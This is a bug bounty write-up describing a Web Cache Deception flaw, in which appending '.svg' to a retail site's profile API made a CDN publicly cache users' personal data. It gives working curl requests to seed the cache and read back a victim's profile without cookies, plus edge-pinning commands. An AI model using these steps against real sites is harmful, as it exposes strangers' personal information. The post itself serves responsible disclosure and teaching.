# One .svg and a CDN

- **Source URL:** https://medium.com/@abhinabshrestha9/one-svg-and-a-cdn-how-a-file-extension-leaked-strangers-pii-c8ca95ba5ddf
- **Fetched from:** https://medium.com/@abhinabshrestha9/one-svg-and-a-cdn-how-a-file-extension-leaked-strangers-pii-c8ca95ba5ddf?source=rss-096a5c1fe13e------2
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/14908 (id 14908)
- **Method:** medium-rss-feed (full content:encoded) readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
- **Author/Published (RSS):** Abhinabshrestha / Fri, 11 Sep 2026 16:20:50 GMT

*A walkthrough of a Web Cache Deception bug that turned a private profile API into a public one — and the story of how it got closed as a duplicate before being reopened and paid.*

It’s been a long while since I last wrote anything here. Life, work, and a long stretch of just heads-down hunting got in the way of writing it up. This bug felt like the right one to break the silence with — it’s a clean idea, and the story behind its resolution taught me more than the bug itself did. So, after a long time: hello again, and let’s get into it.

A retail site exposed an authenticated profile API at:

/api/v2/account/profile

That endpoint is meant to return **your** data and nobody else’s. It carried the right cache headers (private, no-cache, no-store) and worked exactly as intended.

But if you appended a static file extension:

/api/v2/account/profile.svg

…the backend still returned the full profile JSON — and, because of the extension, it now came back with Cache-Control: private, max-age=31536000. The CDN in front of the app happily cached that response for a year and served it to **anyone** who visited the same URL, no cookies required.

Send a victim a link. They click it while logged in. Their name, email, phone number, loyalty card number, and hashed identifiers are now sitting on a public edge cache waiting for you to fetch them. That’s Web Cache Deception (WCD).

WCD, first popularized by Omer Gil in 2017, exploits a disagreement between two systems that are supposed to agree on one thing: *what is a cacheable file, and what is dynamic user data?*

When those two disagree — the app treats /profile.svg as a live API call, but the cache treats it as a static image — sensitive dynamic content gets stored in a location that's shared across users.

Two ingredients have to line up:

This target had both.

I was poking at the site’s API surface. The profile endpoint was the obvious high-value target — it returns everything the account knows about you. Authenticated, it behaved correctly:

GET /api/v2/account/profile HTTP/2

Host: www.shop.example

Cookie: \<valid session>

HTTP/2 200

content-type: application/json; charset=utf-8

cache-control: private, max-age=0, no-cache, no-store

server-timing: cdn-cache; desc=MISS

no-cache, no-store — good. The CDN won't touch this.

The instinct with WCD is always: **does the framework normalize extensions?** Many backends (Rails, in this case) route /profile.svg to the same controller as /profile, stripping the extension during routing. So I tried it:

GET /api/v2/account/profile.svg HTTP/2

Host: www.shop.example

Cookie: \<valid session>

HTTP/2 200

content-type: application/json; charset=utf-8

cache-control: private, max-age=31536000 ← !!

server-timing: cdn-cache; desc=MISS

Two things jumped out:

That second point is the whole bug. The framework’s static-asset handling assumed anything ending in .svg was a safe, cacheable file and slapped a long-lived cache header on it — without realizing the *body* was private user data.

A changed header is a lead, not a finding. I needed to prove the CDN genuinely cached the response and served it to an unauthenticated stranger. “Could lead to” is not a bug; you have to build the chain.

**Step 1 — seed the cache (victim, authenticated):**

curl -sk "https://www.shop.example/api/v2/account/profile.svg" \

-H "Cookie: \<valid session>" -D -

HTTP/2 200

cache-control: private, max-age=31536000

server-timing: cdn-cache; desc=MISS

server-timing: origin; dur=93

x-request-id: 1fcdeb65-3a1d-40b9-86a7-d01df8bf26c4

MISS — first request, went to origin, and the CDN just stored the response.

**Step 2 — read it back (attacker, no cookies at all):**

curl -sk "https://www.shop.example/api/v2/account/profile.svg" -D -

HTTP/2 200

cache-control: private, max-age=31536000

server-timing: cdn-cache; desc=HIT

server-timing: edge; dur=1

x-request-id: 1fcdeb65-3a1d-40b9-86a7-d01df8bf26c4

```
{
  "data": {
    "type": "users",
    "attributes": {
      "first-name": "<victim>",
      "last-name": "<victim>",
      "email": "victim@example.com",
      "email-md5": "<hash>",
      "email-sha256": "<hash>",
      "card-number": "<loyalty card>",
      "loyalty-tier": "...",
      "points": 50,
      "mobile-phone": "<phone>",
      "country-calling-code": "+..",
      "mobile-phone-md5": "<hash>",
      "admin": false,
      "is-employee": false
    }
  }
}
```
Three details nail it down:

It worked in a browser too: open the URL in an incognito window and the victim’s data renders as raw JSON on screen.

When I first tried to reproduce from a second machine, the attacker request sometimes returned a sign-in error instead of cached data. For a moment it looked flaky — the kind of inconsistency that makes you wonder if you imagined the whole thing.

The cause was the CDN’s **anycast routing**. A large CDN answers www.shop.example from many physical edge nodes, and the cache is **per-edge**. Two machines can resolve the hostname to two different points of presence — and the copy I seeded lived on only one of them.

The fix for deterministic testing is curl --resolve, which pins the connection to a specific edge IP and skips DNS entirely:

\# find candidate edges

dig +short www.shop.example

\# pin both requests to the SAME edge

curl -sk --resolve[www.shop.example:443:203.0.113.10](http://www.shop.example:443:203.0.113.10) \

"https://www.shop.example/api/v2/account/profile.svg" -D -

Seed and read from the *same* edge IP and it’s 100% reproducible.

It’s worth being clear about what this pinning does and does not mean for real-world impact. --resolve is a **testing** convenience, not an attack prerequisite. In practice, users on the same ISP or in the same region naturally land on the same PoP, and an attacker only has to try the handful of edge IPs dig returns until one gives a HIT. The bug is real; the pinning just removes the routing variable so a triager can reproduce it in one shot.

I put exactly this explanation in the report as a reproduction note, with the pinned commands. If your PoC depends on an environmental quirk, **explain the quirk** — half the “can’t reproduce → not applicable” closures happen because the triager hit the flaky path and gave up.

One cached response leaked, per victim:

The attacker needs **no account**. The only precondition is that the victim clicks a link while logged in — the same bar as a reflected XSS or a CSRF. And because the entry sat in cache with a one-year TTL, a single click had a long shelf life.

I scored it CVSS 3.1 **7.4 (High)** — AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N. The scope change (S:C) is the honest part: the vulnerability lives in the app's headers, but the data crosses the trust boundary at the *caching layer*, a different component than the one that's broken.

Here’s where it gets instructive.

I submitted. Standard “thanks, under review” auto-reply. A few days later the program updated the report — refined the title, tagged it CWE-200 / CWE-524, cleaned up the endpoint list — and then:

**Status: Duplicate.** “Another hunter already submitted the same bug, and determined that we were not going to deploy a fix.” Closed. 2 points.

Two points is the polite version of “we already know, and we’ve decided to live with it.” For a High-severity PII leak, that stung — not because of the points, but because the reasoning was *“we’re not going to fix it.”*

Two things had happened in the meantime that changed the picture, and I’d already reported both:

So I pushed back. Not by arguing about points — by restating the **impact and the facts**: this leaks consumer PII, the remediation that was applied doesn’t close it, and here are the extensions that still work. Politely, once, with evidence.

A few days later:

**Reopened → Under Review → Accepted.** “Indeed, while this is a duplicate of a previously submitted report, we have deemed it still valid because the fix was not fully implemented. We appreciate the additional context on other affected extensions.”

Bounty + bonus points awarded.

**1. “Duplicate” is a status, not a verdict on your work.** A duplicate of an *unfixed* bug — especially one where you can demonstrate the deployed remediation is incomplete — is a live vulnerability. If you’re bringing new, exploitable surface (new extensions, a bypass of the “fix”), that’s frequently enough to reopen. It was here.

**2. Argue impact, never points.** I never once mentioned the reward. Every message was about consumer PII exposure and the specific extensions still leaking. Triagers respond to *“here is data still leaking and here’s how”* far better than to *“I deserve more.”*

**3. Test the fix, then test around it.** When a program says “fixed,” re-run your PoC — and then vary the one parameter the fix depends on. Here the fix was extension-specific, so the obvious probe was *other extensions*. The incompleteness was the whole reason it got accepted.

**4. Make your PoC reproducible on the first try.** The anycast/--resolve note probably saved this report. A bug that only reproduces "sometimes" reads as noise. Explain the environmental variable and hand the triager the deterministic command.

**5. Ask for your own data to be purged.** If your PoC seeds a shared cache with your PII and a long TTL, that data is exposed until it’s evicted. Requesting removal is both the right thing to do and a quiet reminder to the program that the issue is ongoing, not historical.

Fix the class, not the example.

*Written up with all client-identifying details, endpoints, and PII removed or replaced. The technique, headers, and story are real; the target is not named.*
